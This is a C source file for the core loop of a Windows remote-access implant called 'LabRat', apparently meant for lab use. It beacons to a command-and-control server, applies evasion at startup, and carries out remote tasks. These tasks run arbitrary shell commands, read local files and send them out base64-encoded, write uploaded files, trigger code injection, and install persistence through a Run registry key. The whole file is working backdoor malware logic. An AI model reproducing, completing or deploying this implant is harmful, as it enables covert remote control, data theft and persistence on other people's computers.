#include "common.h"

extern int inject_self_test(void);

static void send_result(const char *agent_id, const char *task_id, const char *stdout_s,
                        const char *stderr_s, int rc) {
    char body[8192];
    snprintf(body, sizeof(body),
             "{\"id\":\"%s\",\"op\":\"result\",\"task\":\"%s\",\"stdout\":\"%s\",\"stderr\":\"%s\",\"rc\":%d}",
             agent_id, task_id, stdout_s, stderr_s, rc);
    char resp[MAX_HTTP_RESP];
    http_post_json(BEACON_PATH, body, resp, sizeof(resp));
}

static void json_escape(const char *in, char *out, size_t out_sz) {
    size_t o = 0;
    for (size_t i = 0; in[i] && o + 2 < out_sz; i++) {
        char c = in[i];
        if (c == '"' || c == '\\') {
            out[o++] = '\\';
            out[o++] = c;
        } else if (c == '\n') {
            out[o++] = '\\';
            out[o++] = 'n';
        } else if (c == '\r') {
            out[o++] = '\\';
            out[o++] = 'r';
        } else {
            out[o++] = c;
        }
    }
    out[o] = '\0';
}

static int parse_task(const char *json, task_t *t) {
    memset(t, 0, sizeof(*t));
    if (!json_get_string(json, "cmd", t->cmd, sizeof(t->cmd))) return 0;
    json_get_string(json, "arg", t->arg, sizeof(t->arg));
    json_get_string(json, "id", t->task_id, sizeof(t->task_id));
    return 1;
}

static void handle_task(const char *agent_id, const task_t *t) {
    char out[MAX_CMD_OUT];
    char esc[MAX_CMD_OUT * 2];
    int rc = 0;

    if (strcmp(t->cmd, "shell") == 0) {
        if (run_shell(t->arg, out, sizeof(out), &rc) != 0) {
            snprintf(out, sizeof(out), "shell failed");
            rc = -1;
        }
        json_escape(out, esc, sizeof(esc));
        send_result(agent_id, t->task_id, esc, "", rc);
    } else if (strcmp(t->cmd, "download") == 0) {
        if (file_download(t->arg, out, sizeof(out)) != 0) {
            snprintf(out, sizeof(out), "download failed");
            rc = -1;
            json_escape(out, esc, sizeof(esc));
            send_result(agent_id, t->task_id, esc, "", rc);
        } else {
            /* stdout holds base64 */
            json_escape(out, esc, sizeof(esc));
            send_result(agent_id, t->task_id, esc, "", 0);
        }
    } else if (strcmp(t->cmd, "upload") == 0) {
        char path[MAX_PATH];
        const char *sep = strchr(t->arg, '|');
        if (!sep) {
            send_result(agent_id, t->task_id, "", "bad upload arg", -1);
            return;
        }
        size_t plen = (size_t)(sep - t->arg);
        if (plen >= MAX_PATH) plen = MAX_PATH - 1;
        memcpy(path, t->arg, plen);
        path[plen] = '\0';
        rc = file_upload(path, sep + 1);
        snprintf(out, sizeof(out), rc == 0 ? "upload ok" : "upload failed");
        json_escape(out, esc, sizeof(esc));
        send_result(agent_id, t->task_id, esc, "", rc);
    } else if (strcmp(t->cmd, "inject") == 0) {
        rc = inject_self_test();
        snprintf(out, sizeof(out), rc == 0 ? "inject ok" : "inject failed");
        json_escape(out, esc, sizeof(esc));
        send_result(agent_id, t->task_id, esc, "", rc);
    } else if (strcmp(t->cmd, "persist") == 0) {
        char exe[MAX_PATH];
        GetModuleFileNameA(NULL, exe, MAX_PATH);
        rc = persist_runkey(t->arg[0] ? t->arg : "LabRat", exe);
        snprintf(out, sizeof(out), rc == 0 ? "persist ok" : "persist failed");
        json_escape(out, esc, sizeof(esc));
        send_result(agent_id, t->task_id, esc, "", rc);
    } else {
        snprintf(out, sizeof(out), "unknown cmd");
        json_escape(out, esc, sizeof(esc));
        send_result(agent_id, t->task_id, esc, "", -1);
    }
}

int labrat_main_loop(void) {
    char agent_id[64];
    char body[512];
    char resp[MAX_HTTP_RESP];
    task_t task;

    agent_id_init(agent_id, sizeof(agent_id));
    evasion_apply();

    for (;;) {
        snprintf(body, sizeof(body),
                 "{\"id\":\"%s\",\"op\":\"checkin\",\"os\":\"win\",\"build\":\"labrat-0.5\"}",
                 agent_id);
        if (http_post_json(BEACON_PATH, body, resp, sizeof(resp)) < 0) {
            sleep_jitter();
            continue;
        }
        if (strstr(resp, "\"op\":\"task\"") || strstr(resp, "\"cmd\"")) {
            if (parse_task(resp, &task)) {
                handle_task(agent_id, &task);
                continue;
            }
        }
        sleep_jitter();
    }
    return 0;
}

#ifdef LABRAT_DLL
__declspec(dllexport) void labrat_entry(void) { labrat_main_loop(); }
#endif

int main(void) {
    srand((unsigned)time(NULL) ^ GetTickCount());
    return labrat_main_loop();
}
